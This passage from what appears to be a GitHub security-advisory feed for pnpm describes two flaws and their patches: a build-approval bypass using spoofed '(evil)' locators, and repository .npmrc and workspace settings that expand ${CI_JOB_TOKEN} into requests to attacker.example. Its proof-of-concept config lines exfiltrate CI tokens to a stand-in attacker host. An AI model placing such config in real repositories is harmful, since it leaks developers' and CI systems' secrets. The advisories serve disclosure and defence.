<li>The focused TypeScript suite and ESLint ran directly through the installed harness. The isolated project build cannot resolve workspace packages without a local install, and the configured registry gateway returns HTTP 403 while fetching <code>@pnpm/pacquet@0.11.2</code>; no candidate-focused test failed.</li>
</ul>
<h2 id="patches">Patches</h2>
<p><code>10.34.2</code>: <a href="https://github.com/pnpm/pnpm/commit/14bceb1e0b2a71f4f670774db261feb03f38ec23">https://github.com/pnpm/pnpm/commit/14bceb1e0b2a71f4f670774db261feb03f38ec23</a>
<code>11.5.3</code>: <a href="https://github.com/pnpm/pnpm/commit/bf1b731ee6c0ea98709e671ff0f46bf654480ab8">https://github.com/pnpm/pnpm/commit/bf1b731ee6c0ea98709e671ff0f46bf654480ab8</a></p>
<h2 id="compatibility">Compatibility</h2>
<p>Registry package approvals keep their existing form. Opaque dependencies that were approved through a normalized parenthesized variant must now use the exact key shown in pnpm's ignored-build output. This is the intended trust-boundary change; no package-resolution or artifact format changes.</p>
<h2 id="ci-note">CI note</h2>
<p>GitHub intentionally does not run status checks on temporary private-fork pull requests. The complete policy suites, formatting, and diff checks above are the applicable validation: <a href="https://docs.github.com/code-security/security-advisories/collaborating-in-a-temporary-private-fork-to-resolve-a-security-vulnerability">https://docs.github.com/code-security/security-advisories/collaborating-in-a-temporary-private-fork-to-resolve-a-security-vulnerability</a></p>
<hr>
<p>Written by an agent (Codex, GPT-5).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-5wx6-mg75-v57r">https://github.com/pnpm/pnpm/security/advisories/GHSA-5wx6-mg75-v57r</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55487">https://nvd.nist.gov/vuln/detail/CVE-2026-55487</a></li>
<li><a href="https://github.com/pnpm/pnpm/commit/bf1b731ee6c0ea98709e671ff0f46bf654480ab8">https://github.com/pnpm/pnpm/commit/bf1b731ee6c0ea98709e671ff0f46bf654480ab8</a></li>
<li><a href="https://github.com/pnpm/pnpm/releases/tag/v10.34.2">https://github.com/pnpm/pnpm/releases/tag/v10.34.2</a></li>
<li><a href="https://github.com/pnpm/pnpm/releases/tag/v11.5.3">https://github.com/pnpm/pnpm/releases/tag/v11.5.3</a></li>
<li><a href="https://github.com/advisories/GHSA-5wx6-mg75-v57r">https://github.com/advisories/GHSA-5wx6-mg75-v57r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5wx6-mg75-v57r</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-26T23:18:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm: Manifest identity spoof satisfies allowBuilds and runs attacker lifecycle]]></title>
        <id>https://github.com/advisories/GHSA-5wx6-mg75-v57r</id>
        <link href="https://github.com/advisories/GHSA-5wx6-mg75-v57r"/>
        <updated>2026-06-26T23:18:14.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Keep build approval for opaque dependency sources byte-exact for GHSA-5wx6-mg75-v57r / CAND-PNPM-123.</p>
<p>Merged upstream commit <code>bf1b731ee6</code> fixed the original name-only approval bypass by making build policy consume the resolved dependency identity. One collision remained: the generic peer-suffix normalizer also stripped parenthesized text from git, URL, tarball, file, and other opaque locators. Approval for one source string could therefore authorize a different attacker-controlled source whose locator normalized to the same value.</p>
<h2 id="security-boundary">Security boundary</h2>
<ul>
<li>Registry dependency identities still normalize legitimate peer suffixes and retain patch hashes.</li>
<li>Git, URL, tarball, file, directory, and otherwise opaque identities must match the complete resolved locator byte for byte.</li>
<li>Explicit denials use the same normalization as approvals.</li>
<li>Ignored-build output preserves the exact opaque identity, so the key pnpm asks a user to approve is the key policy later checks.</li>
<li>TypeScript pnpm and pacquet implement the same distinction between registry and opaque identities.</li>
</ul>
<h2 id="exploit-replay">Exploit replay</h2>
<ul>
<li>With <code>allowBuilds</code> approving <code>foo@https://host/pkg.tgz</code>, the upstream implementation also accepted <code>foo@https://host/pkg.tgz(evil)</code> because both passed through peer-suffix removal.</li>
<li>An independent review found a second Rust-only form: <code>foo@https://host/pkg@1.0.0(good)</code> and <code>foo@https://host/pkg@1.0.0(evil)</code> collided because the parser selected the final <code>@</code> and misclassified the opaque URL as a registry package.</li>
<li>A final review found the same parser hazard in source-only locators ending in a semver-looking tail: approval for <code>https://host/pkg@1.0.0</code> could collapse <code>https://host/pkg@1.0.0(evil)</code>.</li>
<li>The final patch rejects all three collision forms, applies the same exactness to deny rules, accepts exact opaque keys as positive controls, and continues to accept registry packages approved without their peer suffixes.</li>
</ul>
<h2 id="files-changed">Files changed</h2>
<ul>
<li><code>building/policy/src/index.ts</code> and <code>building/policy/test/index.ts</code> normalize only parsed registry identities and retain exact opaque keys.</li>
<li><code>pacquet/crates/package-manager/src/build_modules.rs</code> passes snapshot identities to policy, matches TypeScript package-separator parsing, and preserves opaque locators.</li>
<li><code>pacquet/crates/package-manager/src/build_modules/tests.rs</code> covers exact approval and denial, all three collision forms, ignored-build output, and registry peer compatibility.</li>
<li><code>.changeset/quiet-opaque-build-identities.md</code> records patch releases for <code>@pnpm/building.policy</code> and <code>pnpm</code>.</li>
</ul>
<h2 id="commands-run">Commands run</h2>
<pre><code class="language-text">$ jest building/policy/test/index.ts --runInBand
16 passed
$ cargo test -p pacquet-package-manager build_modules::tests -- --nocapture
49 passed
$ cargo fmt --all -- --check
PASS
$ git diff --check 84bb4b1a046f3a659de1c9aab1d45dcf814124ce...HEAD
PASS
</code></pre>
<h2 id="validation">Validation</h2>
<ul>
<li>The TypeScript policy suite passed all 16 tests.</li>
<li>The final pacquet build-policy suite passed all 49 tests.</li>
<li>The new Rust regression reproduced the extra-<code>@</code> collision before the additive fix and passed afterward.</li>
<li>Exact opaque approval and denial, source-only semver-tail collision rejection, registry peer normalization, and ignored-build reporting all have paired tests.</li>
<li>ESLint passed on the changed TypeScript source and test files.</li>
<li>Rust formatting and diff checks passed; the branch is clean and consists of three focused security commits plus additive merges of upstream through <code>84bb4b1a046f3a659de1c9aab1d45dcf814124ce</code>.</li>
<li>The focused TypeScript suite and ESLint ran directly through the installed harness. The isolated project build cannot resolve workspace packages without a local install, and the configured registry gateway returns HTTP 403 while fetching <code>@pnpm/pacquet@0.11.2</code>; no candidate-focused test failed.</li>
</ul>
<h2 id="patches">Patches</h2>
<p><code>10.34.2</code>: <a href="https://github.com/pnpm/pnpm/commit/14bceb1e0b2a71f4f670774db261feb03f38ec23">https://github.com/pnpm/pnpm/commit/14bceb1e0b2a71f4f670774db261feb03f38ec23</a>
<code>11.5.3</code>: <a href="https://github.com/pnpm/pnpm/commit/bf1b731ee6c0ea98709e671ff0f46bf654480ab8">https://github.com/pnpm/pnpm/commit/bf1b731ee6c0ea98709e671ff0f46bf654480ab8</a></p>
<h2 id="compatibility">Compatibility</h2>
<p>Registry package approvals keep their existing form. Opaque dependencies that were approved through a normalized parenthesized variant must now use the exact key shown in pnpm's ignored-build output. This is the intended trust-boundary change; no package-resolution or artifact format changes.</p>
<h2 id="ci-note">CI note</h2>
<p>GitHub intentionally does not run status checks on temporary private-fork pull requests. The complete policy suites, formatting, and diff checks above are the applicable validation: <a href="https://docs.github.com/code-security/security-advisories/collaborating-in-a-temporary-private-fork-to-resolve-a-security-vulnerability">https://docs.github.com/code-security/security-advisories/collaborating-in-a-temporary-private-fork-to-resolve-a-security-vulnerability</a></p>
<hr>
<p>Written by an agent (Codex, GPT-5).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-5wx6-mg75-v57r">https://github.com/pnpm/pnpm/security/advisories/GHSA-5wx6-mg75-v57r</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55487">https://nvd.nist.gov/vuln/detail/CVE-2026-55487</a></li>
<li><a href="https://github.com/pnpm/pnpm/commit/bf1b731ee6c0ea98709e671ff0f46bf654480ab8">https://github.com/pnpm/pnpm/commit/bf1b731ee6c0ea98709e671ff0f46bf654480ab8</a></li>
<li><a href="https://github.com/pnpm/pnpm/releases/tag/v10.34.2">https://github.com/pnpm/pnpm/releases/tag/v10.34.2</a></li>
<li><a href="https://github.com/pnpm/pnpm/releases/tag/v11.5.3">https://github.com/pnpm/pnpm/releases/tag/v11.5.3</a></li>
<li><a href="https://github.com/advisories/GHSA-5wx6-mg75-v57r">https://github.com/advisories/GHSA-5wx6-mg75-v57r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5wx6-mg75-v57r</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-26T23:18:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm: Repository config can expand victim environment secrets into registry requests before scripts run]]></title>
        <id>https://github.com/advisories/GHSA-3qhv-2rgh-x77r</id>
        <link href="https://github.com/advisories/GHSA-3qhv-2rgh-x77r"/>
        <updated>2026-06-26T23:12:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="maintainer-action-plan">Maintainer Action Plan</h2>
<p>This report is ready to review with the shared patch branch. Start with the PR and the expected fixed behavior, then use the detailed exploit narrative below only if you want to replay the original path.</p>
<ul>
<li>Advisory: <code>CAND-PNPM-122</code> / <code>GHSA-3qhv-2rgh-x77r</code></li>
<li>Advisory URL: <a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-3qhv-2rgh-x77r">https://github.com/pnpm/pnpm/security/advisories/GHSA-3qhv-2rgh-x77r</a></li>
<li>Shared patch PR: <a href="https://github.com/pnpm/pnpm-ghsa-j2hc-m6cf-6jm8/pull/1">https://github.com/pnpm/pnpm-ghsa-j2hc-m6cf-6jm8/pull/1</a></li>
<li>Shared patch branch: <code>security/ghsa-batch-2026-06-09</code></li>
<li>Patch commit: <code>a93449314f398cf4bdf2e28d033c02d37395ad22</code></li>
<li>Base commit: <code>origin/main</code> <code>55a4035abf1ae3fe7208ba1f5ef43c5eff58ccec</code></li>
<li>Maintainer priority: <code>start-here</code></li>
<li>Component: <code>pnpm config/env replacement and registry auth</code></li>
<li>Patch area: project .npmrc env placeholders are not expanded into registry/auth destinations</li>
<li>Affected packages: <code>npm:pnpm</code>, <code>npm:@pnpm/config.reader</code>, <code>rust:pacquet</code></li>
<li>CWE IDs: <code>CWE-201</code>, <code>CWE-200</code>, <code>CWE-522</code></li>
<li>Conservative CVSS: <code>6.5</code> / <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N</code></li>
<li>Next action: review the shared patch branch for this component, set the final affected version range, merge and release the fix, then publish or close the advisory.</li>
</ul>
<h3 id="expected-patched-behavior">Expected Patched Behavior</h3>
<p>Project <code>.npmrc</code> environment placeholders do not expand into registry or auth destinations; the secret is absent from the request URL and auth header.</p>
<h3 id="files-and-tests-to-review">Files And Tests To Review</h3>
<ul>
<li><code>config/reader/src/loadNpmrcFiles.ts</code></li>
<li><code>config/reader/src/getOptionsFromRootManifest.ts</code></li>
<li><code>config/reader/test/index.ts</code></li>
<li><code>config/reader/test/getOptionsFromRootManifest.test.ts</code></li>
<li><code>pacquet/crates/config/src/npmrc_auth.rs</code></li>
<li><code>pacquet/crates/config/src/npmrc_auth/tests.rs</code></li>
<li><code>pacquet/crates/config/src/workspace_yaml.rs</code></li>
<li><code>pacquet/crates/config/src/workspace_yaml/tests.rs</code></li>
<li><code>.changeset/sharp-registry-env-placeholders.md</code></li>
</ul>
<h3 id="focused-validation">Focused Validation</h3>
<p>Run these from a checkout of the shared patch branch. They are the useful maintainer commands with machine-local artifact paths removed.</p>
<pre><code class="language-bash">./node_modules/.bin/tsgo --build config/reader/tsconfig.json
NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/getOptionsFromRootManifest.test.ts --runInBand
NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/index.ts -t "project \.npmrc does not expand env variables in registry URLs|project \.npmrc does not expand env variables in scoped registry URLs or URL-scoped keys|project \.npmrc does not expand env variables in auth values|user \.npmrc may expand env variables in registry URLs|drops the placeholder when the env var is unset|substitutes normally when the env var is set|only drops the unresolved placeholder|explicit .*undefined.* fallbacks|pnpm-workspace\.yaml registries do not expand env variables|return a warning when the \.npmrc has an env variable" --runInBand
./node_modules/.bin/eslint config/reader/src/loadNpmrcFiles.ts config/reader/src/getOptionsFromRootManifest.ts config/reader/test/index.ts config/reader/test/getOptionsFromRootManifest.test.ts
cargo fmt --manifest-path pacquet/crates/config/Cargo.toml --check
cargo test --manifest-path pacquet/crates/config/Cargo.toml project_ini_ignores_env_placeholders_in_registry_urls --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml project_ini_ignores_env_placeholders_in_scoped_registry_urls --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml project_ini_ignores_env_placeholders_in_url_scoped_keys --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml project_ini_ignores_env_placeholders_in_auth_values --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml trusted_ini_expands_env_placeholders_in_registry_urls --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml ignores_env_vars_inside_workspace_registry_values --lib
git diff --check
cargo fmt --check
</code></pre>
<p>The full patched replay for the shared branch passed with all 20 candidates marked fixed. This candidate's replay evidence is <code>results/CAND-PNPM-122-patched-result.json</code>.</p>


<h1 id="cand-pnpm-122-repository-config-can-expand-victim-environment-secrets-into-registry-requests-before-scripts-run">CAND-PNPM-122: Repository config can expand victim environment secrets into registry requests before scripts run</h1>
<h2 id="advisory-details">Advisory Details</h2>
<h3 id="summary">Summary</h3>
<p>pnpm and pacquet expanded <code>${ENV_VAR}</code> placeholders from repository-controlled <code>.npmrc</code> and <code>pnpm-workspace.yaml</code> into registry request destinations and registry credentials. A malicious repository could cause dependency resolution to send victim environment secrets to an attacker-selected registry before lifecycle scripts run.</p>
<h3 id="details">Details</h3>
<p>The vulnerable TypeScript pnpm path was:</p>
<ul>
<li><code>config/reader/src/loadNpmrcFiles.ts</code> loaded project <code>.npmrc</code> and substituted environment placeholders in keys and values.</li>
<li><code>config/reader/src/getOptionsFromRootManifest.ts</code> substituted environment placeholders inside workspace <code>registry</code>, <code>registries</code>, and <code>namedRegistries</code> settings.</li>
<li><code>config/reader/src/index.ts</code> merged those expanded registry/auth values into <code>pnpmConfig.registries</code>, <code>pnpmConfig.authConfig</code>, and <code>pnpmConfig.configByUri</code>.</li>
<li><code>resolving/npm-resolver/src/fetch.ts</code> built metadata request URLs from the selected registry.</li>
<li><code>network/fetch/src/fetchFromRegistry.ts</code> dispatched the request and attached matching auth headers before install lifecycle scripts could run.</li>
</ul>
<p>The pacquet parity path was:</p>
<ul>
<li><code>pacquet/crates/config/src/npmrc_auth.rs</code> expanded project <code>.npmrc</code> placeholders while parsing registry URLs and auth values.</li>
<li><code>pacquet/crates/config/src/workspace_yaml.rs</code> expanded workspace registry placeholders.</li>
<li><code>pacquet/crates/resolving-npm-resolver/src/fetch_full_metadata.rs</code> used the configured registry URL and <code>AuthHeaders</code> for metadata fetches.</li>
</ul>
<h3 id="poc">PoC</h3>
<p>Repository <code>.npmrc</code> URL-path exfiltration:</p>
<pre><code class="language-ini">registry=https://attacker.example/${CI_JOB_TOKEN}/
</code></pre>
<p>Repository <code>.npmrc</code> auth-header exfiltration:</p>
<pre><code class="language-ini">registry=https://attacker.example/
//attacker.example/:_authToken=${CI_JOB_TOKEN}
</code></pre>
<p>Repository <code>pnpm-workspace.yaml</code> URL-path exfiltration:</p>
<pre><code class="language-yaml">registries:
  default: https://attacker.example/${CI_JOB_TOKEN}/
namedRegistries:
  work: https://attacker.example/${CI_JOB_TOKEN}/npm/
</code></pre>
<p>Exploit method:</p>
<ol>
<li>The victim checks out the repository and runs a pnpm or pacquet dependency-management command with <code>CI_JOB_TOKEN</code> or another sensitive environment variable present.</li>
<li>Before the patch, repository config expanded the placeholder to the victim secret.</li>
<li>The resolver used the expanded registry or matching auth entry to construct a metadata request.</li>
<li>The victim sent a request such as <code>https://attacker.example/&lt;secret&gt;/&lt;package&gt;</code> or <code>Authorization: Bearer &lt;secret&gt;</code> to the attacker-controlled endpoint.</li>
</ol>
<p>Validation PoC:</p>
<p>The PoC models the pre-patch URL and Authorization-header leaks, then verifies that patched pnpm and pacquet do not keep the secret in repository-controlled registry destinations or credential values.</p>
<h3 id="impact">Impact</h3>
<p>A malicious repository can disclose environment secrets present in a developer or CI process to a repository-selected registry before script controls apply. This can expose npm tokens, CI job tokens, OIDC helper inputs, or other conventional environment secrets if the attacker knows or guesses their names.</p>
<h2 id="affected-products">Affected Products</h2>
<p>Ecosystem: npm</p>
<p>Package name: <code>pnpm</code>, <code>@pnpm/config.reader</code>; pacquet Rust port</p>
<p>Affected versions: current main before this patch, when project <code>.npmrc</code> or <code>pnpm-workspace.yaml</code> contains environment placeholders in registry request destinations or project <code>.npmrc</code> contains environment placeholders in registry credential values.</p>
<p>Patched versions: pending release containing this patch.</p>
<h2 id="severity">Severity</h2>
<p>Severity before patch: High</p>
<p>Vector string before patch: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N</code></p>
<p>Score before patch: 7.4</p>
<p>Severity after patch: None</p>
<p>Vector string after patch: not vulnerable after patch</p>
<p>Score after patch: 0.0</p>
<p>Rationale: exploitation is remote and low complexity once a victim runs pnpm or pacquet in the malicious repository. No attacker privileges are required, but user interaction is required. The demonstrated sink is secret disclosure through outbound registry requests, not arbitrary code execution, so confidentiality is high while integrity and availability are not directly impacted by this finding. After the patch, repository-controlled registry destinations and credential values containing env placeholders are ignored, while trusted user/global/auth.ini/CLI config still expands.</p>
<h2 id="weaknesses">Weaknesses</h2>
<p>CWE-201: Insertion of Sensitive Information Into Sent Data</p>
<p>CWE-200: Exposure of Sensitive Information to an Unauthorized Actor</p>
<p>CWE-522: Insufficiently Protected Credentials</p>
<h2 id="patch">Patch</h2>
<p>The patch makes environment expansion trust-aware for registry requests:</p>
<ul>
<li>Project <code>.npmrc</code> no longer expands <code>${...}</code> in <code>registry</code>, <code>@scope:registry</code>, proxy URL values, URL-scoped keys such as <code>//host/${SECRET}/:_authToken</code>, or registry credential values such as <code>//host/:_authToken=${SECRET}</code> and <code>_authToken=${SECRET}</code>.</li>
<li>User <code>.npmrc</code>, auth.ini, CLI, global, and environment config still support env expansion for trusted registry configuration.</li>
<li><code>pnpm-workspace.yaml</code> no longer expands <code>${...}</code> in <code>registry</code>, <code>registries</code>, or <code>namedRegistries</code> URL values.</li>
<li>Trusted user-level auth values such as <code>//registry.npmjs.org/:_authToken=${NODE_AUTH_TOKEN}</code> still expand or lossy-drop as before, preserving setup-node and OIDC trusted-publishing behavior when the <code>.npmrc</code> is supplied as user config.</li>
<li>Pacquet mirrors the same boundary with <code>from_project_ini()</code> for project <code>.npmrc</code> and workspace registry filtering.</li>
</ul>
<p>Changed files:</p>
<ul>
<li><code>config/reader/src/loadNpmrcFiles.ts</code></li>
<li><code>config/reader/src/getOptionsFromRootManifest.ts</code></li>
<li><code>config/reader/test/index.ts</code></li>
<li><code>config/reader/test/getOptionsFromRootManifest.test.ts</code></li>
<li><code>pacquet/crates/config/src/npmrc_auth.rs</code></li>
<li><code>pacquet/crates/config/src/npmrc_auth/tests.rs</code></li>
<li><code>pacquet/crates/config/src/workspace_yaml.rs</code></li>
<li><code>pacquet/crates/config/src/workspace_yaml/tests.rs</code></li>
</ul>
<p>Changeset:</p>
<ul>
<li><code>.changeset/sharp-registry-env-placeholders.md</code></li>
</ul>
<p>Pacquet parity:</p>
<p>Ported in the same patch. Pacquet dependency-management commands now parse project <code>.npmrc</code> with request-destination and credential-value env expansion disabled, and drop workspace registry values containing <code>${...}</code> placeholders.</p>
<h2 id="verification">Verification</h2>
<p>Post-patch validation:</p>
<p>The PoC ran:</p>
<pre><code class="language-bash">./node_modules/.bin/tsgo --build config/reader/tsconfig.json
NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/getOptionsFromRootManifest.test.ts --runInBand
NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/index.ts -t "project \.npmrc does not expand env variables in registry URLs|project \.npmrc does not expand env variables in scoped registry URLs or URL-scoped keys|project \.npmrc does not expand env variables in auth values|user \.npmrc may expand env variables in registry URLs|drops the placeholder when the env var is unset|substitutes normally when the env var is set|only drops the unresolved placeholder|explicit .*undefined.* fallbacks|pnpm-workspace\.yaml registries do not expand env variables|return a warning when the \.npmrc has an env variable" --runInBand
./node_modules/.bin/eslint config/reader/src/loadNpmrcFiles.ts config/reader/src/getOptionsFromRootManifest.ts config/reader/test/index.ts config/reader/test/getOptionsFromRootManifest.test.ts
cargo fmt --manifest-path pacquet/crates/config/Cargo.toml --check
cargo test --manifest-path pacquet/crates/config/Cargo.toml project_ini_ignores_env_placeholders_in_registry_urls --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml project_ini_ignores_env_placeholders_in_scoped_registry_urls --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml project_ini_ignores_env_placeholders_in_url_scoped_keys --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml project_ini_ignores_env_placeholders_in_auth_values --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml trusted_ini_expands_env_placeholders_in_registry_urls --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml ignores_env_vars_inside_workspace_registry_values --lib
git diff --check
</code></pre>
<p>Results:</p>
<ul>
<li>PoC pre-patch model showed <code>cand122-ci-job-token</code> in both a request URL and a bearer auth header.</li>
<li>TypeScript build for <code>config.reader</code>: passed.</li>
<li>Focused root-manifest tests: 8 passed, including workspace registry and named-registry placeholder denial.</li>
<li>Focused config-reader integration tests: 10 passed, covering project <code>.npmrc</code> default registry denial, scoped registry denial, URL-scoped-key denial, project auth-value denial, trusted user <code>.npmrc</code> registry expansion, trusted user auth-value expansion/lossy fallback, and workspace registry denial.</li>
<li><code>cargo fmt --check</code>: passed.</li>
<li>Focused pacquet tests: 6 passed, covering project <code>.npmrc</code> registry denial, scoped registry denial, URL-scoped-key denial, auth-value denial, trusted <code>.npmrc</code> registry expansion, and workspace YAML denial.</li>
<li><code>git diff --check</code>: passed.</li>
</ul>
<h2 id="cvss-reassessment">CVSS Reassessment</h2>
<p>The initial scan score used a repository-code-execution vector:</p>
<p><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</code> (8.8 High)</p>
<p>The PoC and source trace showed this finding is direct secret disclosure through registry request URLs or Authorization headers, not a code execution path. The corrected vulnerable vector is:</p>
<p><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N</code></p>
<p>Corrected vulnerable score: 7.4 High.</p>
<p>Final score after patch: 0.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-3qhv-2rgh-x77r">https://github.com/pnpm/pnpm/security/advisories/GHSA-3qhv-2rgh-x77r</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55180">https://nvd.nist.gov/vuln/detail/CVE-2026-55180</a></li>
<li><a href="https://github.com/advisories/GHSA-3qhv-2rgh-x77r">https://github.com/advisories/GHSA-3qhv-2rgh-x77r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3qhv-2rgh-x77r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-26T23:12:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm: Repository config can expand victim environment secrets into registry requests before scripts run]]></title>
        <id>https://github.com/advisories/GHSA-3qhv-2rgh-x77r</id>
        <link href="https://github.com/advisories/GHSA-3qhv-2rgh-x77r"/>
        <updated>2026-06-26T23:12:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="maintainer-action-plan">Maintainer Action Plan</h2>
<p>This report is ready to review with the shared patch branch. Start with the PR and the expected fixed behavior, then use the detailed exploit narrative below only if you want to replay the original path.</p>
<ul>
<li>Advisory: <code>CAND-PNPM-122</code> / <code>GHSA-3qhv-2rgh-x77r</code></li>
<li>Advisory URL: <a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-3qhv-2rgh-x77r">https://github.com/pnpm/pnpm/security/advisories/GHSA-3qhv-2rgh-x77r</a></li>
<li>Shared patch PR: <a href="https://github.com/pnpm/pnpm-ghsa-j2hc-m6cf-6jm8/pull/1">https://github.com/pnpm/pnpm-ghsa-j2hc-m6cf-6jm8/pull/1</a></li>
<li>Shared patch branch: <code>security/ghsa-batch-2026-06-09</code></li>
<li>Patch commit: <code>a93449314f398cf4bdf2e28d033c02d37395ad22</code></li>
<li>Base commit: <code>origin/main</code> <code>55a4035abf1ae3fe7208ba1f5ef43c5eff58ccec</code></li>
<li>Maintainer priority: <code>start-here</code></li>
<li>Component: <code>pnpm config/env replacement and registry auth</code></li>
<li>Patch area: project .npmrc env placeholders are not expanded into registry/auth destinations</li>
<li>Affected packages: <code>npm:pnpm</code>, <code>npm:@pnpm/config.reader</code>, <code>rust:pacquet</code></li>
<li>CWE IDs: <code>CWE-201</code>, <code>CWE-200</code>, <code>CWE-522</code></li>
<li>Conservative CVSS: <code>6.5</code> / <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N</code></li>
<li>Next action: review the shared patch branch for this component, set the final affected version range, merge and release the fix, then publish or close the advisory.</li>
</ul>
<h3 id="expected-patched-behavior">Expected Patched Behavior</h3>
<p>Project <code>.npmrc</code> environment placeholders do not expand into registry or auth destinations; the secret is absent from the request URL and auth header.</p>
<h3 id="files-and-tests-to-review">Files And Tests To Review</h3>
<ul>
<li><code>config/reader/src/loadNpmrcFiles.ts</code></li>
<li><code>config/reader/src/getOptionsFromRootManifest.ts</code></li>
<li><code>config/reader/test/index.ts</code></li>
<li><code>config/reader/test/getOptionsFromRootManifest.test.ts</code></li>
<li><code>pacquet/crates/config/src/npmrc_auth.rs</code></li>
<li><code>pacquet/crates/config/src/npmrc_auth/tests.rs</code></li>
<li><code>pacquet/crates/config/src/workspace_yaml.rs</code></li>
<li><code>pacquet/crates/config/src/workspace_yaml/tests.rs</code></li>
<li><code>.changeset/sharp-registry-env-placeholders.md</code></li>
</ul>
<h3 id="focused-validation">Focused Validation</h3>
<p>Run these from a checkout of the shared patch branch. They are the useful maintainer commands with machine-local artifact paths removed.</p>
<pre><code class="language-bash">./node_modules/.bin/tsgo --build config/reader/tsconfig.json
NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/getOptionsFromRootManifest.test.ts --runInBand
NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/index.ts -t "project \.npmrc does not expand env variables in registry URLs|project \.npmrc does not expand env variables in scoped registry URLs or URL-scoped keys|project \.npmrc does not expand env variables in auth values|user \.npmrc may expand env variables in registry URLs|drops the placeholder when the env var is unset|substitutes normally when the env var is set|only drops the unresolved placeholder|explicit .*undefined.* fallbacks|pnpm-workspace\.yaml registries do not expand env variables|return a warning when the \.npmrc has an env variable" --runInBand
./node_modules/.bin/eslint config/reader/src/loadNpmrcFiles.ts config/reader/src/getOptionsFromRootManifest.ts config/reader/test/index.ts config/reader/test/getOptionsFromRootManifest.test.ts
cargo fmt --manifest-path pacquet/crates/config/Cargo.toml --check
cargo test --manifest-path pacquet/crates/config/Cargo.toml project_ini_ignores_env_placeholders_in_registry_urls --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml project_ini_ignores_env_placeholders_in_scoped_registry_urls --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml project_ini_ignores_env_placeholders_in_url_scoped_keys --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml project_ini_ignores_env_placeholders_in_auth_values --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml trusted_ini_expands_env_placeholders_in_registry_urls --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml ignores_env_vars_inside_workspace_registry_values --lib
git diff --check
cargo fmt --check
</code></pre>
<p>The full patched replay for the shared branch passed with all 20 candidates marked fixed. This candidate's replay evidence is <code>results/CAND-PNPM-122-patched-result.json</code>.</p>


<h1 id="cand-pnpm-122-repository-config-can-expand-victim-environment-secrets-into-registry-requests-before-scripts-run">CAND-PNPM-122: Repository config can expand victim environment secrets into registry requests before scripts run</h1>
<h2 id="advisory-details">Advisory Details</h2>
<h3 id="summary">Summary</h3>
<p>pnpm and pacquet expanded <code>${ENV_VAR}</code> placeholders from repository-controlled <code>.npmrc</code> and <code>pnpm-workspace.yaml</code> into registry request destinations and registry credentials. A malicious repository could cause dependency resolution to send victim environment secrets to an attacker-selected registry before lifecycle scripts run.</p>
<h3 id="details">Details</h3>
<p>The vulnerable TypeScript pnpm path was:</p>
<ul>
<li><code>config/reader/src/loadNpmrcFiles.ts</code> loaded project <code>.npmrc</code> and substituted environment placeholders in keys and values.</li>
<li><code>config/reader/src/getOptionsFromRootManifest.ts</code> substituted environment placeholders inside workspace <code>registry</code>, <code>registries</code>, and <code>namedRegistries</code> settings.</li>
